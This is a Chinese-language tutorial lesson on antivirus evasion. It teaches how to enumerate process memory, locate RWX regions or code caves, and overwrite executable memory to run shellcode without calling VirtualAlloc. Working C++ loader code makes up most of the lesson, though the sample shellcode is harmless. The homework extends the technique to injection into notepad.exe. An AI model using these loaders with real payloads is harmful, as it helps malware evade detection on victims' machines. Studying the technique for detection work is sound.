# 课时04：遍历内存块执行ShellCode

## 1. 课程概述

### 1.1 学习目标

- 理解Windows内存分页机制
- 掌握内存区域遍历技术
- 学会在现有可执行内存中注入ShellCode
- 理解如何绕过内存分配检测

### 1.2 前置知识

- Windows内存管理基础
- 内存保护属性概念
- VirtualQuery API使用

---

## 2. 名词解释

### 2.1 核心术语

| 术语 | 说明 |
|------|------|
| **内存页** | 内存管理的最小单位，Windows中通常为4KB |
| **内存区域** | 连续的内存页集合，具有相同属性 |
| **PAGE_EXECUTE** | 可执行内存属性 |
| **PAGE_EXECUTE_READ** | 可读可执行内存属性 |
| **PAGE_EXECUTE_READWRITE** | 可读写可执行内存属性 |
| **VirtualQuery** | 查询内存区域信息的API |
| **Code Cave** | 代码洞穴，可执行模块中未使用的空间 |

### 2.2 内存保护属性

```cpp
#define PAGE_NOACCESS          0x01   // 不可访问
#define PAGE_READONLY          0x02   // 只读
#define PAGE_READWRITE         0x04   // 可读写
#define PAGE_WRITECOPY         0x08   // 写时复制
#define PAGE_EXECUTE           0x10   // 可执行
#define PAGE_EXECUTE_READ      0x20   // 可执行+可读
#define PAGE_EXECUTE_READWRITE 0x40   // 可执行+可读写
#define PAGE_EXECUTE_WRITECOPY 0x80   // 可执行+写时复制
#define PAGE_GUARD             0x100  // 保护页
```

---

## 3. 技术原理

### 3.1 为什么遍历内存块

1. **避免分配新内存**：VirtualAlloc调用可能被监控
2. **利用现有可执行内存**：寻找RWX或可写的可执行区域
3. **Code Cave注入**：在现有模块的空洞中写入代码

### 3.2 遍历流程

```
从地址 0 开始
    ↓
VirtualQuery 获取区域信息
    ↓
检查内存属性
    ↓
找到可写+可执行区域?
    ↓
写入ShellCode并执行
```

---

## 4. 实现代码

### 4.1 遍历进程内存

```cpp
#include <windows.h>
#include <stdio.h>

// 遍历当前进程的所有内存区域
void EnumerateMemory() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    printf("%-20s %-12s %-12s %-20s\n", 
           "Address", "Size", "State", "Protect");
    printf("%s\n", "---------------------------------------------------------------");
    
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        char state[20] = "";
        char protect[30] = "";
        
        // 状态
        switch (mbi.State) {
            case MEM_COMMIT:  strcpy(state, "COMMIT"); break;
            case MEM_RESERVE: strcpy(state, "RESERVE"); break;
            case MEM_FREE:    strcpy(state, "FREE"); break;
        }
        
        // 保护属性
        if (mbi.State == MEM_COMMIT) {
            if (mbi.Protect & PAGE_EXECUTE_READWRITE)
                strcpy(protect, "RWX");
            else if (mbi.Protect & PAGE_EXECUTE_READ)
                strcpy(protect, "RX");
            else if (mbi.Protect & PAGE_EXECUTE)
                strcpy(protect, "X");
            else if (mbi.Protect & PAGE_READWRITE)
                strcpy(protect, "RW");
            else if (mbi.Protect & PAGE_READONLY)
                strcpy(protect, "R");
            else
                sprintf(protect, "0x%X", mbi.Protect);
        }
        
        if (mbi.State == MEM_COMMIT) {
            printf("0x%p     0x%-10zX %-12s %-20s\n",
                   mbi.BaseAddress, mbi.RegionSize, state, protect);
        }
        
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
}

int main() {
    printf("========== Memory Enumeration ==========\n");
    EnumerateMemory();
    return 0;
}
```

### 4.2 查找可执行可写区域

```cpp
#include <windows.h>
#include <stdio.h>

// 查找RWX内存区域
LPVOID FindRWXMemory(SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    printf("[*] Searching for RWX memory...\n");
    
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_EXECUTE_READWRITE) &&
            mbi.RegionSize >= requiredSize) {
            
            printf("[+] Found RWX region at: 0x%p (Size: 0x%zX)\n",
                   mbi.BaseAddress, mbi.RegionSize);
            return mbi.BaseAddress;
        }
        
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    printf("[-] No RWX memory found\n");
    return NULL;
}

// 查找带有空间的可执行区域 (Code Cave)
LPVOID FindCodeCave(SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    printf("[*] Searching for code caves...\n");
    
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        // 查找可执行区域
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ))) {
            
            // 扫描末尾的NULL字节序列
            LPBYTE pScan = (LPBYTE)mbi.BaseAddress + mbi.RegionSize - requiredSize;
            BOOL allNull = TRUE;
            
            for (SIZE_T i = 0; i < requiredSize; i++) {
                if (pScan[i] != 0x00 && pScan[i] != 0xCC) {
                    allNull = FALSE;
                    break;
                }
            }
            
            if (allNull) {
                printf("[+] Found code cave at: 0x%p\n", pScan);
                return pScan;
            }
        }
        
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    return NULL;
}

int main() {
    // 示例ShellCode
    unsigned char shellcode[] = "\xCC\xCC\xCC\xCC";  // int3
    SIZE_T shellcodeSize = sizeof(shellcode);
    
    // 方法1: 查找RWX区域
    LPVOID pRWX = FindRWXMemory(shellcodeSize);
    if (pRWX) {
        printf("[*] Can write shellcode to RWX region\n");
    }
    
    // 方法2: 查找Code Cave
    LPVOID pCave = FindCodeCave(shellcodeSize);
    if (pCave) {
        printf("[*] Can potentially use code cave\n");
    }
    
    return 0;
}
```

### 4.3 在现有模块中注入执行

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // nop sled
    0xC3                     // ret
};

BOOL InjectToExistingModule() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        // 查找已提交的内存
        if (mbi.State == MEM_COMMIT && mbi.RegionSize >= sizeof(shellcode)) {
            
            // 如果是RWX，直接写入
            if (mbi.Protect & PAGE_EXECUTE_READWRITE) {
                printf("[+] Found RWX at: 0x%p\n", mbi.BaseAddress);
                
                memcpy(mbi.BaseAddress, shellcode, sizeof(shellcode));
                printf("[+] ShellCode written!\n");
                
                // 执行
                ((void(*)())mbi.BaseAddress)();
                return TRUE;
            }
            
            // 如果是RX，尝试修改保护属性
            if (mbi.Protect & PAGE_EXECUTE_READ) {
                DWORD oldProtect;
                
                if (VirtualProtect(mbi.BaseAddress, sizeof(shellcode),
                                   PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    
                    printf("[+] Changed protection at: 0x%p\n", mbi.BaseAddress);
                    
                    memcpy(mbi.BaseAddress, shellcode, sizeof(shellcode));
                    
                    // 恢复保护
                    VirtualProtect(mbi.BaseAddress, sizeof(shellcode),
                                   oldProtect, &oldProtect);
                    
                    // 执行
                    ((void(*)())mbi.BaseAddress)();
                    return TRUE;
                }
            }
        }
        
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    return FALSE;
}

int main() {
    printf("========== Memory Block ShellCode Execution ==========\n");
    
    if (!InjectToExistingModule()) {
        printf("[-] Injection failed\n");
    }
    
    return 0;
}
```

---

## 5. 免杀应用

### 5.1 优势

- 不调用VirtualAlloc等敏感API
- 利用现有内存，不引起内存分配异常
- 可以在合法模块中执行代码

### 5.2 注意事项

- 修改内存保护可能触发检测
- 需要确保目标区域未被使用
- 代码洞穴大小可能有限

---

## 6. 课后作业

### 6.1 基础练习

1. 遍历当前进程所有内存区域，统计各类保护属性的数量
2. 查找所有可执行区域并列出

### 6.2 进阶练习

1. 在notepad.exe中找到Code Cave并注入ShellCode
2. 实现不调用VirtualAlloc/VirtualProtect的ShellCode加载器

### 6.3 思考题

1. 现代系统中RWX内存为什么很少见？
2. 如何检测进程中的异常内存属性修改？

---

## 7. 下一课预告

下一课我们将学习**“重写R3 API”**，通过重新实现底层API来绕过Hook检测。
